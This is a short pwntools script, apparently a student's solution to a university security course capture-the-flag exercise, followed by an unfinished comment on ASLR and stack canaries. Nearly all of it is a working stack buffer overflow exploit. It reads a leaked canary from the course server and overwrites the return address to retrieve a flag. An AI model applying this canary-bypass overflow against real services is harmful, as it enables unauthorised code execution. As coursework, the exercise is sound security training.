#!/usr/bin/python3

from pwn import *
from pwn import p64

io = remote('inf226.puffling.no', 7002)

io.recvuntil(b'? ')
io.sendline(b'24') 

r = io.recvline()
prompt = b"Here's a hint: "
canary = r[r.startswith(prompt) and len(prompt):]

io.recvline()
io.send(cyclic(24) + p64(int(canary, 16)) + cyclic(8) + p64(0x40121B)) 
io.shutdown()

recieved = io.recvall().decode()
flag = recieved.splitlines()[-2]
print(f'Flag 02: {flag}')





'''
ADDITIONAL QUESTIONS

What sort of mitigation technique is in use here?
How could you prevent this attack?
- The mitigation technique used in this exercise is 
  Address Space Layout Randomization (ASLR) and a 
  stack canary.

  In order to execute the attack, I have temporarily 
  disabled ASLR system wide using the terminal command
  recommended in the Hints section of the assignment
  markdown. 
  In order to circumvent the stack canary, ---------

  https://ritcsec.wordpress.com/2017/05/18/buffer-overflows-aslr-and-stack-canaries/



'''
